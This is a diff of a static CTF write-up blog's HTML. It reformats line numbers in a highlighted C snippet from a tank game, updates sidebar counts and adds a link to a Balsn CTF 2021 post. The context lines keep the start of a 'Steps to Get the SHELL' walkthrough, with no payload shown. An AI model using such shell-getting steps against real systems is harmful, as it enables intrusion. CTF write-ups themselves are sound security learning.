-</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
-</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">		tanks[j].hp <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
-		<span style="color:#ff79c6">if</span> ( j )
-<span style="display:block;width:100%;background-color:#3d3f4a">		  Message_ <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34; Stay &amp; practice :)&#34;</span>;
-</span>		<span style="color:#ff79c6">else</span>
-		  Message_ <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34; Game Over.&#34;</span>;
-		<span style="color:#ff79c6">if</span> ( j )
-		  Tank_1 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;RED&#34;</span>;
-		<span style="color:#ff79c6">else</span>
-		  Tank_1 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;GREEN&#34;</span>;
-		sprintf(s, <span style="color:#f1fa8c">&#34;%s tank destroyed.%s&#34;</span>, Tank_1, Message_);
-		SendText(c, s);
-</code></pre></td></tr></table>
-</div>
-</div><p>Steps to Get the <strong>SHELL</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100</span>		tanks[j].hp <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101</span>		<span style="color:#ff79c6">if</span> ( j )
+<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102</span>		  Message_ <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34; Stay &amp; practice :)&#34;</span>;
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103</span>		<span style="color:#ff79c6">else</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104</span>		  Message_ <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34; Game Over.&#34;</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105</span>		<span style="color:#ff79c6">if</span> ( j )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106</span>		  Tank_1 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;RED&#34;</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107</span>		<span style="color:#ff79c6">else</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108</span>		  Tank_1 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;GREEN&#34;</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109</span>		sprintf(s, <span style="color:#f1fa8c">&#34;%s tank destroyed.%s&#34;</span>, Tank_1, Message_);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110</span>		SendText(c, s);
+</code></pre></div><p>Steps to Get the <strong>SHELL</strong>:</p>
 <ol>
 <li>Use the aimbot to kill <strong>Red Tank</strong></li>
 <li>Clear the Ground (clear all the bits on the stack)</li>
@@ -1054,9 +710,9 @@ We can easily do that by carefully using the <strong>Dirtball</strong> and the <
         <ul class="widget__list"><li class="cat-item cat-item-2">
                 <a href="https://x3ero0.github.io/categories/crackmes/">Crackmes (7)</a>
             </li><li class="cat-item cat-item-2">
-                <a href="https://x3ero0.github.io/categories/ctf/">CTF (1)</a>
+                <a href="https://x3ero0.github.io/categories/ctf/">CTF (2)</a>
             </li><li class="cat-item cat-item-2">
-                <a href="https://x3ero0.github.io/categories/pwn/">Pwn (2)</a>
+                <a href="https://x3ero0.github.io/categories/pwn/">Pwn (3)</a>
             </li><li class="cat-item cat-item-2">
                 <a href="https://x3ero0.github.io/categories/rev/">Rev (5)</a>
             </li>
@@ -1069,6 +725,12 @@ We can easily do that by carefully using the <strong>Dirtball</strong> and the <
             
                 
                     <li>
+                        <a href="https://x3ero0.github.io/posts/orxw_balsn_ctf_2021_pwn/">or⊕w writeup from Balsn CTF 2021</a>
+                    </li>
+                
+            
+                
+                    <li>
                         <a href="https://x3ero0.github.io/posts/easy_kernel_exploitation/">Easy_Kernel Writeup from K3RN3LCTF 2021</a>
                     </li>
                 
@@ -1111,8 +773,6 @@ We can easily do that by carefully using the <strong>Dirtball</strong> and the <
                     <li>
                         <a href="https://x3ero0.github.io/posts/hsctf-license/">HSCTF License</a>
                     </li>
-                
-            
                 
             
         </ul>
@@ -1124,6 +784,12 @@ We can easily do that by carefully using the <strong>Dirtball</strong> and the <
             
                 
                     <li>
+                        <a href="https://x3ero0.github.io/posts/orxw_balsn_ctf_2021_pwn/">or⊕w writeup from Balsn CTF 2021</a>
+                    </li>
+                
+            
+                
+                    <li>
                         <a href="https://x3ero0.github.io/posts/easy_kernel_exploitation/">Easy_Kernel Writeup from K3RN3LCTF 2021</a>
                     </li>
                 
@@ -1166,8 +832,6 @@ We can easily do that by carefully using the <strong>Dirtball</strong> and the <
                     <li>
                         <a href="https://x3ero0.github.io/posts/hsctf-license/">HSCTF License</a>
                     </li>
-                
-            
                 
             
         </ul>
